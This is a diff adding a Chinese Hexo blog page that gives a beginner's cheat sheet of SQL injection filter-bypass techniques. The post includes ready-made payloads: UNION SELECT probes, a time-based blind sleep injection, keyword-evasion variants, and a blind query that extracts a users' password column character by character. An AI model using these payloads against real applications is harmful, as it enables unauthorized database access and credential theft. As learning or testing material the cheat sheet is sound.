@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/huaji.ico >
+    <title>
+        blog
+    </title>
+    <meta name="description" content= 歪比歪比 >
+    <meta name="keywords" content= Blog,Hexo,Huaji >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            sql注入绕过技巧
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h2 id="sql注入绕过技巧"><a href="#sql注入绕过技巧" class="headerlink" title="sql注入绕过技巧"></a>sql注入绕过技巧</h2><p>刚学，大佬们轻喷（）</p>
+<h3 id="空格绕过："><a href="#空格绕过：" class="headerlink" title="空格绕过："></a>空格绕过：</h3><p><code>%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/</code></p>
+<h5 id="数字注入可以使用科学技术法和小数："><a href="#数字注入可以使用科学技术法和小数：" class="headerlink" title="数字注入可以使用科学技术法和小数："></a>数字注入可以使用科学技术法和小数：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1.0 union select 1,2,3,4--</span><br><span class="line"></span><br><span class="line">?id=1e0union select 1,2,3,4--</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用括号，如：</p>
+<p><code>select(user())from huaji where(1=1)and(2=2)</code></p>
+<p>好像通常是在盲注中使用</p>
+<p><code>?id=1&#39;and(sleep(ascii(substr(database(),1))=109))--</code></p>
+<h3 id="and-和or绕过："><a href="#and-和or绕过：" class="headerlink" title="and 和or绕过："></a>and 和or绕过：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">or    ||</span><br><span class="line">and   &amp;&amp;</span><br><span class="line">xor   |   </span><br><span class="line">not   !</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="逗号绕过："><a href="#逗号绕过：" class="headerlink" title="逗号绕过："></a>逗号绕过：</h3><p><strong>通常用from和offset</strong></p>
+<p>在盲注中很多函数都需要有逗号，比如<code>substr()</code>和<code>limit</code>，</p>
+<p><code>select substr(database() from 1 for 1);</code></p>
+<p>而对于limit</p>
+<p><code>select * from huaji limit 0,1</code>等价于</p>
+<p><code>select * from huaji limit 1 offset 0</code></p>
+<h3 id="关键字绕过："><a href="#关键字绕过：" class="headerlink" title="关键字绕过："></a>关键字绕过：</h3><ol>
+<li><p>使用注释符</p>
+<p><code>/**/</code>，<code>//</code>, <code>#</code>, <code>--+</code>, <code>--</code>, <code>%00</code></p>
+</li>
+<li><p>使用大小写，如 </p>
+<p>?id&#x3D;1’ UniOn sELect daTabAsE(),2,daTabAsE(),4,daTabAsE()–+&#96;</p>
+</li>
+<li><p>双写绕过</p>
+<p>?id&#x3D;1’ UNUNIONION SELSELECTECT 1,name ,1,1 FROM sqlite_master WHERE type&#x3D;’table’–</p>
+</li>
+<li><p>内联注释绕过</p>
+<p>id&#x3D;-1’&#x2F;<em>!UnIoN</em>&#x2F; SeLeCT 1,2,concat(&#x2F;<em>!table_name</em>&#x2F;) FrOM &#x2F;<em>information_schema</em>&#x2F;.tables &#x2F;<em>!WHERE <em>&#x2F;&#x2F;</em>!TaBlE_ScHeMa</em>&#x2F; like database()#</p>
+</li>
+<li><p>编码绕过</p>
+<p>如ASCII,HEX，URLencode绕过：</p>
+<p>注：urlencode需要用burpsuite发或者编码两次</p>
+</li>
+<li><p>拼接函数绕过</p>
+<p><code>select concat(&#39;123&#39;,&#39;456&#39;);</code></p>
+</li>
+</ol>
+<h5 id="等价函数或变量（来源于速查表）："><a href="#等价函数或变量（来源于速查表）：" class="headerlink" title="等价函数或变量（来源于速查表）："></a>等价函数或变量（来源于<a target="_blank" rel="noopener" href="https://github.com/BaizeSec/bylibrary/blob/main/docs/%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8.md">速查表</a>）：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line"></span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line"></span><br><span class="line">@@user ==&gt; user()</span><br><span class="line"></span><br><span class="line">@@datadir ==&gt; datadir()</span><br><span class="line"></span><br><span class="line">举例：substring()和substr()无法使用时：?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((select &#x27;password&#x27;),1,1) = 0x70</span><br><span class="line">strcmp(left(&#x27;password&#x27;,1), 0x69) = 1</span><br><span class="line">strcmp(left(&#x27;password&#x27;,1), 0x70) = 0</span><br><span class="line">strcmp(left(&#x27;password&#x27;,1), 0x71) = -1</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>版权所有 © 2020 | 作者: Huaji | 主题 By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">本站浏览总访问量: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">本站访问人数: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
